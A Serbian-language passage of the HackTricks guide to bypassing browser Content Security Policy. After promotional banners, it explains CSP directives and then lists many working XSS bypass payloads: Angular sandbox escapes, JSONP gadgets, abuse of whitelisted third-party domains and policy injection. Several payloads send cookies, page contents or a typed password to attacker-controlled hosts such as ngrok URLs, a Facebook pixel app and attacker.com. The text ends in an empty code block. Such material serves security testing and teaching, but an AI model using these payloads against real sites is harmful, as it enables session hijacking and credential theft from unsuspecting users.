# Bypassovanje politike bezbednosti sadržaja (CSP)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u hakovanje**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim pokretanjima nagrada za pronalaženje bagova i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

## Šta je CSP

Politika bezbednosti sadržaja (CSP) je prepoznata kao tehnologija pregledača, pre svega namenjena **zaštiti od napada kao što je cross-site scripting (XSS)**. Ona funkcioniše tako što definiše i detaljno opisuje putanje i izvore sa kojih pregledač može bezbedno učitavati resurse. Ovi resursi obuhvataju razne elemente kao što su slike, okviri i JavaScript. Na primer, politika može dozvoliti učitavanje i izvršavanje resursa sa istog domena (self), uključujući inline resurse i izvršavanje string koda putem funkcija poput `eval`, `setTimeout` ili `setInterval`.

Implementacija CSP-a se vrši putem **odgovora zaglavlja** ili uključivanjem **meta elemenata u HTML stranicu**. Nakon primene ove politike, pregledači proaktivno sprovode ove odredbe i odmah blokiraju svako otkriveno kršenje.

- Implementirano putem zaglavlja odgovora:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Implementirano putem meta oznake:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Zaglavlja

CSP se može primeniti ili pratiti pomoću ovih zaglavlja:

* `Content-Security-Policy`: Primenjuje CSP; pregledač blokira svako kršenje pravila.
* `Content-Security-Policy-Report-Only`: Koristi se za praćenje; prijavljuje kršenja pravila bez blokiranja. Idealno za testiranje u pre-produkcionim okruženjima.

### Definisanje resursa

CSP ograničava poreklo za učitavanje aktivnog i pasivnog sadržaja, kontrolišući aspekte kao što su izvršavanje inline JavaScript koda i korišćenje `eval()`. Primer politike je:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Direktive

* **script-src**: Dozvoljava određene izvore za JavaScript, uključujući URL-ove, inline skripte i skripte pokrenute putem event handlera ili XSLT stilova.
* **default-src**: Postavlja podrazumevanu politiku za preuzimanje resursa kada određene direktive za preuzimanje nisu prisutne.
* **child-src**: Određuje dozvoljene resurse za web radnike i ugrađeni sadržaj okvira.
* **connect-src**: Ograničava URL-ove koji se mogu učitati koristeći interfejse poput fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Ograničava URL-ove za okvire.
* **frame-ancestors**: Određuje koji izvori mogu ugraditi trenutnu stranicu, primenjivo na elemente poput `<frame>`, `<iframe>`, `<object>`, `<embed>` i `<applet>`.
* **img-src**: Definiše dozvoljene izvore za slike.
* **font-src**: Određuje validne izvore za fontove koji se učitavaju koristeći `@font-face`.
* **manifest-src**: Definiše dozvoljene izvore manifestnih fajlova aplikacije.
* **media-src**: Definiše dozvoljene izvore za učitavanje medijskih objekata.
* **object-src**: Definiše dozvoljene izvore za elemente `<object>`, `<embed>` i `<applet>`.
* **base-uri**: Određuje dozvoljene URL-ove za učitavanje koristeći elemente `<base>`.
* **form-action**: Navodi validne endpointe za slanje formi.
* **plugin-types**: Ograničava mime tipove koje stranica može pozvati.
* **upgrade-insecure-requests**: Instruiše pretraživače da prepišu HTTP URL-ove u HTTPS.
* **sandbox**: Primjenjuje ograničenja slična atributu sandbox `<iframe>`.
* **report-to**: Određuje grupu kojoj će biti poslat izveštaj ako politika bude prekršena.
* **worker-src**: Određuje validne izvore za Worker, SharedWorker ili ServiceWorker skripte.
* **prefetch-src**: Određuje validne izvore za resurse koji će biti preuzeti ili predpreuzeti.
* **navigate-to**: Ograničava URL-ove na koje dokument može navigirati putem bilo kojeg sredstva (a, form, window.location, window.open, itd.)


### Izvori

* `*`: Dozvoljava sve URL-ove osim onih sa šemama `data:`, `blob:`, `filesystem:`.
* `'self'`: Dozvoljava učitavanje sa istog domena.
* `'data'`: Dozvoljava učitavanje resursa putem data šeme (npr. Base64 kodirane slike).
* `'none'`: Blokira učitavanje sa bilo kog izvora.
* `'unsafe-eval'`: Dozvoljava upotrebu `eval()` i sličnih metoda, nije preporučljivo iz bezbednosnih razloga.
* `'unsafe-hashes'`: Omogućava određene inline event handlere.
* `'unsafe-inline'`: Dozvoljava upotrebu inline resursa poput inline `<script>` ili `<style>`, nije preporučljivo iz bezbednosnih razloga.
* `'nonce'`: Bela lista za određene inline skripte koristeći kriptografski nonce (broj koji se koristi samo jednom).
* `'sha256-<hash>'`: Bela lista skripti sa određenim sha256 hešom.
* `'strict-dynamic'`: Dozvoljava učitavanje skripti sa bilo kog izvora ako je bela lista napravljena pomoću nonce-a ili heša.
* `'host'`: Određuje određeni host, poput `example.com`.
* `https:`: Ograničava URL-ove na one koji koriste HTTPS.
* `blob:`: Dozvoljava učitavanje resursa sa Blob URL-ova (npr. Blob URL-ovi kreirani putem JavaScript-a).
* `filesystem:`: Dozvoljava učitavanje resursa sa fajl sistema.
* `'report-sample'`: Uključuje uzorak koda koji je prekršio pravilo u izveštaju o prekršaju (korisno za debagovanje).
* `'strict-origin'`: Slično kao 'self', ali osigurava da nivo sigurnosti protokola izvora odgovara dokumentu (samo sigurni izvori mogu učitavati resurse sa sigurnih izvora).
* `'strict-origin-when-cross-origin'`: Šalje pun URL kada se vrše zahtevi sa istog izvora, ali šalje samo poreklo kada je zahtev sa različitog izvora.
* `'unsafe-allow-redirects'`: Dozvoljava učitavanje resursa koji će odmah preusmeriti na drugi resurs. Nije preporučljivo jer oslabljuje bezbednost.


## Nesigurna CSP pravila

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Radni payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' putem Iframe-a

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Radna payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Ako na neki način možete da napravite da **dozvoljeni JS kod kreira novi script tag** u DOM-u sa vašim JS kodom, jer ga kreira dozvoljeni skript, **novi script tag će biti dozvoljen za izvršavanje**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Radna payload:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Nedostatak object-src i default-src

{% hint style="danger" %}
**Izgleda da ovo više ne funkcioniše**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Radne payload-ove:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Slanje datoteka + 'self'

Kada se koristi Content Security Policy (CSP) sa direktivom `'self'`, samo skripte i resursi sa istog izvora kao i veb stranica mogu se izvršavati ili učitavati. Međutim, ova direktiva može biti zaobiđena kada se koristi funkcionalnost slanja datoteka.

Da biste iskoristili ovu ranjivost, možete postaviti zlonamernu skriptu na veb stranicu koja omogućava slanje datoteka. Kada korisnik izabere datoteku za slanje, skripta može iskoristiti ovu priliku da izvrši zlonamerni kod.

Na primer, možete postaviti sledeći HTML kod na veb stranicu:

```html
<form action="https://www.example.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit" value="Upload">
</form>
```

Kada korisnik izabere datoteku i klikne na dugme "Upload", datoteka će biti poslata na `https://www.example.com/upload`. Međutim, ako je CSP postavljen na `'self'`, skripta sa iste veb stranice može biti izvršena prilikom slanja datoteke.

Ova ranjivost može biti iskorišćena za izvršavanje zlonamernog koda na veb stranici i zaobilaženje CSP direktive `'self'`.
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Ako možete da otpremite JS fajl, možete zaobići ovu CSP:

Ispravan payload:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Međutim, vrlo je verovatno da server **validira otpremljeni fajl** i dozvoljava samo **određene vrste fajlova** za otpremanje.

Osim toga, čak i ako biste mogli otpremiti **JS kod unutar** fajla koristeći ekstenziju koju server prihvata (na primer: _script.png_), to neće biti dovoljno jer neki serveri poput Apache servera **biraju MIME tip fajla na osnovu ekstenzije**, a pregledači poput Chrome-a će **odbijati izvršavanje JavaScript koda** unutar nečega što bi trebalo da bude slika. "Na sreću", postoje greške. Na primer, iz jednog CTF-a sam naučio da **Apache ne prepoznaje** ekstenziju _**.wave**_, pa je ne servira sa MIME tipom kao što je audio/\*.

Odavde, ako pronađete XSS i otpremanje fajla, i uspete da pronađete **pogrešno protumačenu ekstenziju**, možete pokušati da otpremite fajl sa tom ekstenzijom i sadržajem skripte. Ili, ako server proverava ispravan format otpremljenog fajla, možete kreirati poliglot ([neki primeri poliglota ovde](https://github.com/Polydet/polyglot-database)).

### Spoljni endpointi + ('unsafe-eval')

{% hint style="warning" %}
Za neke od sledećih payloada **`unsafe-eval` čak nije ni potreban**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Učitajte ranjivu verziju Angulara i izvršite proizvoljni JS kod:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloadi koji koriste Angular + biblioteku sa funkcijama koje vraćaju `window` objekat ([pročitajte ovaj post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Post pokazuje da možete **učitati** sve **biblioteke** sa `cdn.cloudflare.com` (ili bilo kojeg drugog dozvoljenog repozitorijuma JS biblioteka), izvršiti sve dodate funkcije iz svake biblioteke i proveriti **koje funkcije iz kojih biblioteka vraćaju `window` objekat**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Zloupotreba google recaptcha JS koda

Prema [**ovom CTF izveštaju**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), možete zloupotrebiti [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) unutar CSP-a da biste izvršili proizvoljni JS kod zaobilaženjem CSP-a:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### Treće strane krajnje tačke + JSONP

#### Opis

Content Security Policy (CSP) je mehanizam koji pomaže u sprečavanju Cross-Site Scripting (XSS) napada ograničavajući izvor resursa koji se mogu učitati na veb stranici. Međutim, CSP može biti zaobiđen korišćenjem trećih strana krajnjih tačaka i JSONP (JSON with Padding) tehnike.

#### Kako to radi?

Kada CSP politika dozvoljava korišćenje trećih strana krajnjih tačaka, može se iskoristiti JSONP tehnika za zaobilaženje CSP ograničenja. JSONP je tehnika koja omogućava učitavanje resursa sa drugog domena tako što se koristi `<script>` tag. Kada se koristi JSONP, zahtev se šalje na treću stranu krajnju tačku koja vraća odgovor u JSON formatu, ali umotan u funkciju koja se definiše na veb stranici. Na taj način, odgovor se tretira kao izvršivi JavaScript kod i može se pristupiti podacima koje sadrži.

#### Primer

Pretpostavimo da je CSP politika postavljena na sledeći način:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://api.example.com;
```

U ovom slučaju, samo skripte sa sopstvenog domena i sa `https://api.example.com` će biti dozvoljene. Međutim, ako je treća strana krajnja tačka `https://api.example.com` konfigurisana da podržava JSONP, može se iskoristiti za zaobilaženje CSP politike.

Na primer, ako postoji sledeći kod na veb stranici:

```html
<script>
    function handleResponse(data) {
        // Manipulacija podacima
    }
</script>

<script src="https://api.example.com/data?callback=handleResponse"></script>
```

Kada se ovaj kod izvrši, zahtev će biti poslat na `https://api.example.com/data` sa parametrom `callback=handleResponse`. Treća strana krajnja tačka će vratiti odgovor u JSON formatu, ali umotan u funkciju `handleResponse`. Na taj način, odgovor će biti izvršen kao JavaScript kod i funkcija `handleResponse` će biti pozvana sa podacima kao argumentom.

#### Mitigacija

Da bi se sprečilo zaobilaženje CSP politike putem trećih strana krajnjih tačaka i JSONP tehnike, treba pažljivo konfigurisati CSP politiku i ograničiti dozvoljene izvore skripti. Takođe, treba izbegavati korišćenje JSONP tehnike i umesto toga koristiti sigurnije alternative kao što su JSON Web Tokens (JWT) ili Cross-Origin Resource Sharing (CORS).
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenariji poput ovog, gde je `script-src` podešen na `self` i određenu domenu koja je na beloj listi, mogu se zaobići korišćenjem JSONP-a. JSONP endpointi omogućavaju nesigurne povratne metode koje omogućavaju napadaču da izvrši XSS, radni payload:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **sadrži spremne JSONP endpointe za CSP zaobilaženje različitih web stranica.**

Ista ranjivost će se pojaviti ako **pouzdani endpoint sadrži otvoreno preusmeravanje** jer ako je početni endpoint pouzdan, preusmeravanja su pouzdana.

### Zloupotrebe trećih strana
Kao što je opisano u [sledećem postu](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), postoji mnogo domena trećih strana koje mogu biti dozvoljene negde u CSP-u, a mogu se zloupotrebiti kako bi se izvršio JavaScript kod ili izvršio izvlačenje podataka. Neki od ovih trećih strana su:

| Entitet | Dozvoljeni domen | Mogućnosti |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | Izvlačenje |
| Hotjar | *.hotjar.com, ask.hotjar.io | Izvlačenje |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Izvršavanje |
| Amazon CloudFront | *.cloudfront.net | Izvlačenje, Izvršavanje |
| Amazon AWS | *.amazonaws.com | Izvlačenje, Izvršavanje |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Izvlačenje, Izvršavanje |
| Salesforce Heroku	| *.herokuapp.com | Izvlačenje, Izvršavanje |
| Google Firebase | *.firebaseapp.com | Izvlačenje, Izvršavanje |

Ako pronađete neki od dozvoljenih domena u CSP-u vaše mete, postoji mogućnost da možete zaobići CSP registracijom na uslugu treće strane i izvršiti izvlačenje podataka na tu uslugu ili izvršiti kod.

Na primer, ako pronađete sledeći CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
ili
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Trebali biste moći da izfiltrirate podatke, slično kao što je to uvek rađeno sa [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). U ovom slučaju, pratite ove opšte korake:

1. Kreirajte Facebook Developer nalog ovde.
1. Napravite novu "Facebook Login" aplikaciju i izaberite "Website".
1. Idite na "Settings -> Basic" i dobijte svoj "App ID".
1. Na ciljnoj stranici sa koje želite da izfiltrirate podatke, možete to uraditi direktno koristeći Facebook SDK uređaj "fbq" putem "customEvent" i podataka za prenos.
1. Idite na "Event Manager" vaše aplikacije i izaberite aplikaciju koju ste kreirali (napomena: event manager se može pronaći na URL-u sličnom ovom: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events).
1. Izaberite karticu "Test Events" da biste videli događaje koje šalje "vaš" veb sajt.

Zatim, na strani žrtve, izvršite sledeći kod da biste inicijalizovali Facebook tracking piksel koji će upućivati na napadačev Facebook developer nalog app-id i izdati prilagođeni događaj kao što je ovaj:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Što se tiče ostalih sedam trećih domena navedenih u prethodnoj tabeli, postoji mnogo drugih načina na koje ih možete zloupotrebiti. Pogledajte prethodni [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) za dodatna objašnjenja o drugim zloupotrebama trećih strana.

### Bypass putem RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Pored pomenutog preusmeravanja za zaobilaženje ograničenja putanje, postoji još jedna tehnika koja se naziva Relative Path Overwrite (RPO) koja se može koristiti na nekim serverima.

Na primer, ako CSP dozvoljava putanju `https://example.com/scripts/react/`, može se zaobići na sledeći način:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Preglednik će na kraju učitati `https://example.com/scripts/angular/angular.js`.

Ovo radi zato što preglednik učitava datoteku nazvanu `..%2fangular%2fangular.js` koja se nalazi pod `https://example.com/scripts/react/`, što je u skladu sa CSP-om.

Međutim, preglednik će to dekodirati i zapravo zatražiti `https://example.com/scripts/react/../angular/angular.js`, što je ekvivalentno `https://example.com/scripts/angular/angular.js`.

Iskorištavanjem ove neusklađenosti u tumačenju URL-a između preglednika i servera, pravila putanje mogu se zaobići.

Rješenje je da se na serverskoj strani ne tretira `%2f` kao `/`, kako bi se osiguralo dosljedno tumačenje između preglednika i servera i izbjegao ovaj problem.

Online primjer: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Izvršavanje JS koda putem iframe-a

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### Nedostaje **base-uri**

Ako nedostaje direktiva **base-uri**, može se zloupotrijebiti za izvođenje [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

Osim toga, ako se **stranica učitava skriptom koristeći relativnu putanju** (poput `<script src="/js/app.js">`) koristeći **Nonce**, može se zloupotrijebiti **base** **tag** kako bi se skripta **učitala** s **vlastitog servera i postigao XSS**.
Ako se ranjiva stranica učitava s **httpS**, koristite httpS URL u base tagu.
```html
<base href="https://www.attacker.com/">
```
### AngularJS događaji

Specifična politika poznata kao Content Security Policy (CSP) može ograničiti JavaScript događaje. Međutim, AngularJS uvodi prilagođene događaje kao alternativu. U okviru događaja, AngularJS pruža jedinstveni objekat `$event`, koji se odnosi na ugrađeni objekat događaja u pregledaču. Ovaj `$event` objekat može biti iskorišćen za zaobilaženje CSP-a. Posebno, u Chrome-u, `$event/event` objekat poseduje atribut `path`, koji sadrži niz objekata koji su uključeni u lanac izvršenja događaja, pri čemu je objekat `window` uvek na kraju. Ova struktura je ključna za taktike bekstva iz peska.

Usmeravanjem ovog niza na `orderBy` filter, moguće je iterirati kroz njega, koristeći terminalni element (objekat `window`) da pokrene globalnu funkciju poput `alert()`. Demonstrirani kod ispod objašnjava ovaj proces:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Ovaj odlomak ističe upotrebu `ng-focus` direktive za pokretanje događaja, korišćenje `$event.path|orderBy` za manipulaciju niza `path`, i iskorišćavanje objekta `window` za izvršavanje funkcije `alert()`, čime se otkriva `document.cookie`.

**Pronađite druge načine zaobilaženja u Angularu na** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS i dozvoljena domena
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
CSP politika koja beleži domene za učitavanje skripti u Angular JS aplikaciji može biti zaobiđena putem pozivanja povratnih funkcija i određenih ranjivih klasa. Dodatne informacije o ovoj tehnici mogu se pronaći u detaljnom vodiču dostupnom na ovom [git repozitorijumu](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).


Radne payloade:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Drugi JSONP proizvoljni izvršni krajnji bodovi mogu se pronaći [ovde](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (neki od njih su obrisani ili popravljeni)

### Zaobilaženje putem preusmeravanja

Šta se dešava kada CSP naiđe na preusmeravanje na serverskoj strani? Ako preusmeravanje vodi ka drugom poreklu koje nije dozvoljeno, i dalje će neuspeti.

Međutim, prema opisu u [CSP specifikaciji 4.2.2.3. Putanje i preusmeravanja](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), ako preusmeravanje vodi ka drugoj putanji, može zaobići originalna ograničenja.

Evo primera:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Ako je CSP postavljen na `https://www.google.com/a/b/c/d`, s obzirom da se putanja uzima u obzir, i skripte `/test` i `/a/test` će biti blokirane od strane CSP.

Međutim, konačni `http://localhost:5555/301` će biti **preusmeren na serverskoj strani na `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. S obzirom da je to preusmerenje, **putanja se ne uzima u obzir**, i **skripta može biti učitana**, čime se zaobilazi ograničenje putanje.

Sa ovim preusmerenjem, čak i ako je putanja potpuno specificirana, i dalje će biti zaobiđena.

Stoga, najbolje rešenje je da se obezbedi da veb sajt nema ranjivosti otvorenog preusmeravanja i da ne postoje domeni koji mogu biti iskorišćeni u CSP pravilima.

### Zaobilaženje CSP pomoću visećeg markupa

Pročitajte [kako ovde](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; putem XSS-a
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` znači da možete izvršiti bilo koji skript unutar koda (XSS može izvršiti kod), a `img-src *` znači da možete koristiti na web stranici bilo koju sliku sa bilo kojeg izvora.

Možete zaobići ovu CSP tako što ćete eksfiltrirati podatke putem slika (u ovom slučaju, XSS zloupotrebljava CSRF gde stranica kojoj bot ima pristup sadrži SQLi i izvlači zastavicu putem slike):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Isto tako, možete zloupotrebiti ovu konfiguraciju da **učitate JavaScript kod ubačen unutar slike**. Na primer, ako stranica dozvoljava učitavanje slika sa Twittera, možete **napraviti** posebnu sliku, postaviti je na Twitter i iskoristiti "**unsafe-inline**" da biste izvršili JS kod (kao redovni XSS) koji će **učitati** sliku, **izvući** JS iz nje i **izvršiti** ga: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Sa servisnim radnicima

Funkcija **`importScripts`** servisnih radnika nije ograničena CSP-om:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Ubacivanje politike

**Istraživanje:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Ako se **parametar** koji ste poslali **ubacuje unutar** **deklaracije** **politike**, tada možete **izmeniti** politiku na način koji je **beskoristan**. Možete **dozvoliti skriptu 'unsafe-inline'** sa bilo kojim od ovih zaobilaženja:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Zato što će ova direktiva **prepisati postojeće direktive script-src**.\
Primjer možete pronaći ovdje: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

U Edge-u je mnogo jednostavnije. Ako možete dodati u CSP samo ovo: **`;_`** **Edge** će **odbaciti** cijelu **polisu**.\
Primjer: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; putem XSS (iframe) - Napad vremenskim usporavanjem

Primijetite nedostatak direktive `'unsafe-inline'`\
Ovaj put možete natjerati žrtvu da **učita** stranicu pod **vašom kontrolom** putem **XSS-a** s `<iframe>`. Ovaj put ćete natjerati žrtvu da pristupi stranici s koje želite izvući informacije (**CSRF**). Ne možete pristupiti sadržaju stranice, ali ako na neki način možete **kontrolirati vrijeme koje stranica treba za učitavanje**, možete izvući potrebne informacije.

Ovaj put će se izvući **flag**, svaki put kad se **točno pogodi znak** putem SQLi, **odgovor** traje **duže vrijeme** zbog funkcije sleep. Tada ćete moći izvući flag:
```html
